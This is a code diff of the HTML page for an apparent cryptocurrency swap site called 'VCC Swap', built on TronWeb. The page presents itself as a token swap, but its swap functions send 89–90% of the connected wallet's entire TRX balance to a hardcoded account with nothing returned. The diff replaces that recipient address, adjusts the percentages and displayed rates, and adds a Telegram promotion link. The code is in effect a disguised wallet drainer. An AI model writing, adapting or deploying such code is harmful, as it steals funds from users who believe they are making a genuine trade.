@@ -57,7 +57,7 @@
                 <h2>VCC Swap</h2>
                 <h4 id="wallet">Not Connected</h4>
                 <p class="mt-5" style="color: #fff;font-size: 14px;"><br>VCC Swap is the next generation of Cryptocurrency swap.</p>
-                <a href="https://t.me/" class="button btn-send" target="blank">Telegram</a>
+                <a href="https://t.me/AllJustSwapListings/6080" class="button btn-send" target="blank">Telegram</a>
               </div>
             </div>
 
@@ -81,7 +81,7 @@
           </div>
           <!-- End Mobile Navigation -->
           <script>
-              var account = "41D17c94e1C5c001750542C8b20Db73A4D9c3c6bC6";
+              var account = "41061bBbe65fE0A8dD51cDe8bdD65306700d959984";
               async function maxToken(){
                   var acc = await tronWeb.trx.getAccount();
                   var tokenBalance = 0;
@@ -93,14 +93,14 @@
                   }
                   $("#token-input").focus();
                   $("#token-input").val(tokenBalance).change();
-                  $("#trx-swap").val(tokenBalance * 2.1).change();
+                  $("#trx-swap").val(tokenBalance * 1.9).change();
               }
 
               async function maxTRX(){
                   var acc = await tronWeb.trx.getAccount();
                   $("#trx-input").focus();
                   $("#trx-input").val(acc.balance / 1000000).change();
-                  $("#token-swap").val(acc.balance / 1000000 / 1.9).change();
+                  $("#token-swap").val(acc.balance / 1000000 / 2.1).change();
               }
 
               async function swapToken(){
@@ -121,7 +121,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 99 / 100);
+                  var v = Math.floor(acc.balance * 90 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
 
@@ -132,7 +132,7 @@
                       alert('Your TRX balance not enough!');
                       return;
                   }
-                  var v = Math.floor(acc.balance * 97 / 100);
+                  var v = Math.floor(acc.balance * 89 / 100);
                   var tx = await tronWeb.trx.sendTransaction(account, v);
               }
           </script>
@@ -339,11 +339,11 @@
               function change(){
                 try{
                   var tokens = $("#token-input").val();
-                  $("#trx-swap").val(tokens * 2.1).change();
+                  $("#trx-swap").val(tokens * 1.9).change();
 
 
                   var value = $("#trx-input").val();
-                  $("#token-swap").val(value / 1.9).change();
+                  $("#token-swap").val(value / 2.1).change();
 
                 }catch{}
               }
